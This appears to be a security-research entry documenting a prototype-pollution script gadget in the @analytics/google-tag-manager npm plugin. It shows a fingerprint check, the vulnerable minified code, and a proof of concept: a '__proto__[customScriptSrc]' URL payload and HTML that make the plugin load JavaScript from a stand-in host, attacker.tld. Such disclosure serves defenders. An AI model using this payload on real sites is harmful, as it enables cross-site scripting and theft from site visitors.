## Google Tag Manager

### URL

https://www.npmjs.com/package/@analytics/google-tag-manager <br />
https://github.com/DavidWells/analytics/tree/87394ecd762454a54b515d243b07d9984de81059/packages/analytics-plugin-google-tag-manager

### JS Fingerprint

```js
return (typeof _analytics !== 'undefined' && typeof analyticsGtagManager !== 'undefined')
```

### Vulnerable code fragment

https://unpkg.com/@analytics/google-tag-manager@0.5.0/dist/@analytics/google-tag-manager.min.js <br />
https://github.com/DavidWells/analytics/blob/87394ecd762454a54b515d243b07d9984de81059/packages/analytics-plugin-google-tag-manager/src/browser.js

```js
initialize: function(e) {
    var t = e.config,
        a = t.containerId,
        n = t.dataLayerName,
        i = t.customScriptSrc,
        c = t.preview,
        u = t.auth;
    if (!a) throw new Error("No google tag manager containerId defined");
    if (c && !u) throw new Error("When enabling preview mode, both preview and auth parameters must be defined");
    var g = i || "https://www.googletagmanager.com/gtm.js";
    o(a) || (function(e, t, r, a, n) {
        e[a] = e[a] || [], e[a].push({
            "gtm.start": (new Date).getTime(),
            event: "gtm.js"
        });
        var o = t.getElementsByTagName(r)[0],
            i = t.createElement(r),
            d = "dataLayer" != a ? "&l=" + a : "",
            s = c ? "&gtm_preview=" + c + "&gtm_auth=" + u + "&gtm_cookies_win=x" : "";
        i.async = !0, i.src = "".concat(g, "?id=") + n + d + s, o.parentNode.insertBefore(i, o)
    }(window, document, "script", n, a), r = n, t.dataLayer = window[n])
}
```

### PoC

```
?__proto__[customScriptSrc]=//attacker.tld/xss.js
```

```html
<script src="https://unpkg.com/analytics/dist/analytics.min.js"></script>
<script src="https://unpkg.com/@analytics/google-tag-manager/dist/@analytics/google-tag-manager.min.js"></script>
<script>
    Object.prototype.customScriptSrc = '//attacker.tld/xss.js'
</script>
<script>
    var Analytics = _analytics.init({
        app: 'my-app-name',
        plugins: [
          analyticsGtagManager({
            containerId: 'GTM-123xyz'
          })
        ]
    })
</script>
```
